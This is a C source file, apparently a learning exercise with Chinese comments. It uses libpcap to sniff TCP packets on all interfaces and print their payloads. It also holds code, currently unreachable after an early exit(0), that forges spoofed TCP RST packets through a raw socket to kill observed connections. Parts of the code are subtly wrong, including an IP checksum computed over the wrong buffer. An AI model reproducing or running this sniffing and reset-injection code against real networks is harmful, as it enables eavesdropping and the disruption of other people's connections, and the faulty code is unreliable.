#include <pcap/pcap.h>
#define __USE_BSD        /* Using BSD IP header           */
#include <netinet/ip.h>  /* Internet Protocol             */
#define __FAVOR_BSD      /* Using BSD TCP header          */
#include <netinet/tcp.h> /* Transmission Control Protocol */
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

#define MAXBYTES2CAPTURE 65535

#define TCPSYN_LEN 20

// Pseudoheader (Used to compute TCP checksum. Check RFC 793)
typedef struct pseudoheader
{
    u_int32_t src;
    u_int32_t dst;
    u_char zero;
    u_char protocol;
    u_int16_t tcplen;
} tcp_phdr_t;

int TCP_RST_send(u_int32_t seq, u_int32_t src_ip, u_int32_t dst_ip, u_int16_t src_port, u_int16_t dst_port);
u_int16_t in_cksum(u_int16_t *addr, int len);

void print_bytes(const char *payload, size_t size)
{
    const char *tmp_ptr = payload;
    int byte_cnt = 0;
    while (byte_cnt++ < size)
    {
        printf("%c", *tmp_ptr);
        tmp_ptr++;
    }
    printf("\n");
}

void pktHandler(u_char *arg, const struct pcap_pkthdr *pkt_hdr, const u_char *pkt)
{
    struct ether_header *etherhdr = (struct ether_header *)pkt;
    u_int16_t ether_type = ntohs(etherhdr->ether_type);
    if (ether_type != ETHERTYPE_IP)
    {
        return; // 忽略非 ip pkt
    }

    if (pkt_hdr->caplen != pkt_hdr->len)
    {
        fprintf(stderr, "包长 %d bytes, 实际捕获: %d bytes\n", pkt_hdr->len, pkt_hdr->caplen);
        exit(1);
    }

    // FIXME print pkt_hdr->ts

    // ether hdr 固定长度14byte
    int ether_hdr_len = 14;

    {
        const u_char *ip_hdr = pkt + ether_hdr_len;
        // 网络字节序ip_hl在第一个字节的低位4bit, 见README.md
        // ip_hl 代表 多少个 32bit segment, * 4才为bytes数
        int ip_hdr_len = ((*ip_hdr) & 0x0F) * 4;
        u_char protocol = *(ip_hdr + 9); // 第10个字节为protocol, 见README.md
        if (protocol != IPPROTO_TCP)
        {
            return; // 忽略非tcp pkt
        }

        const u_char *tcp_hdr = ip_hdr + ip_hdr_len;
        // 网络字节序下th_off在tcp_hdr偏移12字节(第13字节)高位4bit, 见README.md
        // 需要将高位4bit右移到低位, th_off 也表示多少个 32bit word
        int tcp_hdr_len = (((*(tcp_hdr + 12)) & 0xF0) >> 4) * 4;

        int total_hdr_len = ether_hdr_len + ip_hdr_len + tcp_hdr_len;
        int payload_len = pkt_hdr->caplen - total_hdr_len;
        assert(payload_len >= 0);
        const u_char *payload = tcp_hdr + tcp_hdr_len;

        // printf("ip_hdr_len=%d tcp_hdr_len=%d payload_len=%d\n", ip_hdr_len, tcp_hdr_len, payload_len);

        /*
        struct ip *ip_s = (struct ip *)ip_hdr;
        struct tcphdr *tcphdr_s = (struct tcphdr *)tcp_hdr;
        */

        // if (payload_len > 0)
        // {
        //
        // }
    }

    // FIXME 忽略ipv6

    {
        // 或者 强制类型转换, 不需要自己算, 直接读, 疑问: 这里为什么不用自己ntoh转字节序????????
        struct ip *ip_hdr = (struct ip *)(pkt + ether_hdr_len);
        int ip_hdr_sz = ip_hdr->ip_hl * 4;
        struct tcphdr *tcp_hdr = (struct tcphdr *)(pkt + ether_hdr_len + ip_hdr_sz);
        int tcp_hdr_sz = tcp_hdr->th_off * 4;
        int total_hdr_sz = ether_hdr_len + ip_hdr_sz + tcp_hdr_sz;
        int payload_sz = pkt_hdr->caplen - total_hdr_sz;
        assert(payload_sz >= 0);
        const u_char *payload = pkt + total_hdr_sz;

        printf("ip_hdr_size=%d tcp_hdr_size=%d payload_size=%d\n", ip_hdr_sz, tcp_hdr_sz, payload_sz);
        if (payload_sz > 0)
        {
            print_bytes((char *)payload, payload_sz);
        }
    }
}

/* main(): Main function. Opens network interface for capture. Tells the kernel*/
/* to deliver packets with the ACK or PSH-ACK flags set. Prints information    */
/* about captured packets. Calls TCP_RST_send() to kill the TCP connection     */
/* using TCP RST packets.                                                      */
int main(int argc, char **argv)
{
    char *device;
    if (argc < 2)
    {
        device = "any";
    }
    else
    {
        device = argv[1];
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 ip_raw = 0;          /* IP address as integer */
    bpf_u_int32 subnet_mask_raw = 0; /* Subnet mask as integer */
    // 查询网卡IP地址与子网掩码
    // device = any ip与mask 均为0.0.0.0
    if (pcap_lookupnet(device, &ip_raw, &subnet_mask_raw, errbuf) == -1)
    {
        fprintf(stderr, "ERROR pcap_lookupnet, %s\n", errbuf);
        exit(1);
    }

    char ip_buf[INET6_ADDRSTRLEN];
    char mask_buf[INET6_ADDRSTRLEN];
    inet_ntop(AF_INET, &ip_raw, ip_buf, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &subnet_mask_raw, mask_buf, INET_ADDRSTRLEN);
    printf("%s ip=%s mask=%s\n", device, ip_buf, mask_buf);

    int pkt_cnt_limit = 0;    /* unlimited count */
    int timeout_limit = 1000; /* In milliseconds */
    // 这里不限制pkt数量, 没秒从内核缓冲区读入一次数据
    pcap_t *descr = pcap_open_live(device, MAXBYTES2CAPTURE, pkt_cnt_limit, timeout_limit, errbuf);
    if (descr == NULL)
    {
        fprintf(stderr, "ERROR pcap_open_live, %s\n", errbuf);
        exit(1);
    }

    // int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
    /* The contract we have to satisfy with our callback function */
    // typedef void (*pcap_handler)(u_char *, const struct pcap_pkthdr *, const u_char *);
    if (pcap_loop(descr, pkt_cnt_limit, pktHandler, NULL) == -1)
    {
        fprintf(stderr, "ERROR pcap_loop, %s", errbuf);
        exit(1);
    }
    exit(0);

    struct bpf_program filter;
    // Compiles the filter expression into a BPF filter program
    if (pcap_compile(descr, &filter, "(tcp[13] == 0x10) or (tcp[13] == 0x18)", 1, subnet_mask_raw) == -1)
    {
        fprintf(stderr, "ERROR pcap_compile, %s\n", pcap_geterr(descr));
        exit(1);
    }

    // Load the fitler program into the pakcet capture device
    if (pcap_setfilter(descr, &filter) == -1)
    {
        fprintf(stderr, "ERROR pcap_setfilter, %s\n", pcap_geterr(descr));
        exit(1);
    }

    struct pcap_pkthdr *pkthdr;
    struct ip *iphdr = NULL;
    struct tcphdr *tcphdr = NULL;
    const u_char *packet = NULL;
    int count = 0;
    int r = 0;

    // pkthdr = malloc(sizeof(*pkthdr));
    // char buf[INET6_ADDRSTRLEN];
    // memset(buf, 0, sizeof(buf));

    while (1)
    {
        // packet = pcap_next(descr, pkthdr);
        // if (packet == NULL)
        // {
        //     continue;
        //     // fprintf(stderr, "ERROR pcap_next, %s\n", pcap_geterr(descr));
        //     // exit(1);
        // }

        r = pcap_next_ex(descr, &pkthdr, &packet);
        if (r == 0)
        {
            continue;
        }
        if (r == -1)
        {
            fprintf(stderr, "ERROR pcap_next, %s\n", pcap_geterr(descr));
            exit(1);
        }

        assert(pkthdr->len == pkthdr->caplen);

        iphdr = (struct ip *)(packet + 14);
        tcphdr = (struct tcphdr *)(packet + 14 + 20);

        if (count == 0)
        {
            printf("+-------------------------+\n");
        }

        printf("Received Packet No.%d:\n", ++count);
        printf("   ACK: %u\n", ntohl(tcphdr->th_ack));
        printf("   SEQ: %u\n", ntohl(tcphdr->th_seq));

        printf("   DST IP: %s\n", inet_ntoa(iphdr->ip_dst));
        printf("   SRC IP: %s\n", inet_ntoa(iphdr->ip_src));

        // inet_ntop(AF_INET, &(iphdr->ip_dst), buf, INET_ADDRSTRLEN);
        // printf("   DST IP: %s\n", buf);
        // inet_ntop(AF_INET, &(iphdr->ip_src), buf, INET_ADDRSTRLEN);
        // printf("   SRC IP: %s\n", buf);
        printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport));
        printf("   DST PORT: %d\n", ntohs(tcphdr->th_dport));

        TCP_RST_send(tcphdr->th_ack, iphdr->ip_dst.s_addr, iphdr->ip_src.s_addr, tcphdr->th_dport, tcphdr->th_sport);
        TCP_RST_send(htonl(ntohl(tcphdr->th_seq) + 1), iphdr->ip_src.s_addr, iphdr->ip_dst.s_addr, tcphdr->th_sport, tcphdr->th_dport);

        printf("+-------------------------+\n");
    }

    return 0;
}

/* TCP_RST_send(): Crafts a TCP packet with the RST flag set using the supplied */
/* values and sends the packet through a raw socket.   */
int TCP_RST_send(u_int32_t seq, u_int32_t src_ip, u_int32_t dst_ip, u_int16_t src_port, u_int16_t dst_port)
{
    int pkt_len = sizeof(struct tcphdr) + sizeof(struct ip);
    char packet[pkt_len + 1];
    memset(packet, 0, sizeof(packet));

    struct ip *iphdr = (struct ip *)packet;
    struct tcphdr *tcphdr = (struct tcphdr *)(packet + sizeof(struct ip));

    tcp_phdr_t pseudohdr;
    memset(&pseudohdr, 0, sizeof(pseudohdr));

    char tcpcsumblock[sizeof(tcp_phdr_t) + TCPSYN_LEN];

    /* IP Header */
    iphdr->ip_hl = 5;  /* Header lenght in octects                       */
    iphdr->ip_v = 4;   /* Ip protocol version (IPv4)                     */
    iphdr->ip_tos = 0; /* Type of Service (Usually zero)                 */
    iphdr->ip_len = htons(pkt_len);
    iphdr->ip_off = 0;  /* Fragment offset. We'll not use this            */
    iphdr->ip_ttl = 64; /* Time to live: 64 in Linux, 128 in Windows...   */
    iphdr->ip_p = 6;    /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
    iphdr->ip_sum = 0;  /* Checksum. It has to be zero for the moment     */
    iphdr->ip_id = htons(1337);
    iphdr->ip_src.s_addr = src_ip; /* Source IP address                    */
    iphdr->ip_dst.s_addr = dst_ip; /* Destination IP address               */

    /* TCP Header */
    tcphdr->th_seq = seq;                         /* Sequence Number                         */
    tcphdr->th_ack = htonl(1);                    /* Acknowledgement Number                  */
    tcphdr->th_x2 = 0;                            /* Variable in 4 byte blocks. (Deprecated) */
    tcphdr->th_off = 5;                           /* Segment offset (Lenght of the header)   */
    tcphdr->th_flags = TH_RST;                    /* TCP Flags. We set the Reset Flag        */
    tcphdr->th_win = htons(4500) + rand() % 1000; /* Window size               */
    tcphdr->th_urp = 0;                           /* Urgent pointer.                         */
    tcphdr->th_sport = src_port;                  /* Source Port                             */
    tcphdr->th_dport = dst_port;                  /* Destination Port                        */
    tcphdr->th_sum = 0;                           /* Checksum. (Zero until computed)         */

    /* Fill the pseudoheader so we can compute the TCP checksum*/
    pseudohdr.src = iphdr->ip_src.s_addr;
    pseudohdr.dst = iphdr->ip_dst.s_addr;
    pseudohdr.zero = 0;
    pseudohdr.protocol = iphdr->ip_p;
    pseudohdr.tcplen = htons(sizeof(struct tcphdr));

    memcpy(tcpcsumblock, &pseudohdr, sizeof(pseudohdr));
    memcpy(tcpcsumblock + sizeof(tcp_phdr_t), tcphdr, sizeof(*tcphdr));

    tcphdr->th_sum = in_cksum((unsigned short *)tcpcsumblock, sizeof(tcpcsumblock));
    iphdr->ip_sum = in_cksum((unsigned short *)tcpcsumblock, sizeof(struct ip));

    int rawsockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rawsockfd < 0)
    {
        perror("ERROR socket");
        exit(1);
    }

    /* We need to tell the kernel that we'll be adding our own IP header */
    /* Otherwise the kernel will create its own. */
    int yes = 1;
    if (setsockopt(rawsockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof(yes)) < 0)
    {
        perror("ERROR setsockopt IPPROTO_IP IP_HDRINCL");
        exit(1);
    }

    struct sockaddr_in dstaddr;
    memset(&dstaddr, 0, sizeof(dstaddr));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_port = dst_port;
    dstaddr.sin_addr.s_addr = dst_ip;

    if (sendto(rawsockfd, packet, pkt_len, 0, (struct sockaddr *)&dstaddr, sizeof(dstaddr)) < 0)
    {
        perror("ERROR sendto");
        return -1;
    }

    printf("Sent RST Packet:\n");
    printf("   SRC: %s:%d\n", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
    printf("   DST: %s:%d\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
    printf("   Seq=%u\n", ntohl(tcphdr->th_seq));
    printf("   Ack=%d\n", ntohl(tcphdr->th_ack));
    printf("   TCPsum: %02x\n", tcphdr->th_sum);
    printf("   IPsum: %02x\n", iphdr->ip_sum);

    close(rawsockfd);

    return 0;
}

/* This piece of code has been used many times in a lot of differents tools. */
/* I haven't been able to determine the author of the code but it looks like */
/* this is a public domain implementation of the checksum algorithm */
unsigned short in_cksum(unsigned short *addr, int len)
{

    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    /*
* Our algorithm is simple, using a 32-bit accumulator (sum),
* we add sequential 16-bit words to it, and at the end, fold back 
* all the carry bits from the top 16 bits into the lower 16 bits. 
*/

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nleft == 1)
    {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);                 /* add carry */
    answer = ~sum;                      /* truncate to 16 bits */
    return (answer);
}